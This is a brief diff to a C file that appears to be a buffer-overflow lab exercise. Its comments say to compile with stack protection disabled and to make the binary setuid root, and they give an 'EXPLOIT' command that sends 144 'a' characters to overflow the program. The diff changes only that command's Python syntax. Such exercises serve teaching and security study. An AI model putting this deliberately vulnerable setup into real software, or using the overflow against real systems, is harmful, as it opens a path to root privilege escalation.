@@ -9,7 +9,7 @@
 // COMPILE $ gcc -fno-stack-protector bof2.c -o bof2
 // SETUID  $ sudo chown root:root bof2
 //         $ sudo chmod 4755 bof2
-// EXPLOIT $ ./bof2 `python -c "print('a'*144)"`
+// EXPLOIT $ ./bof2 `python -c "print 'a'*144"`
 
 void vuln(char * arg) {
     int innocent;
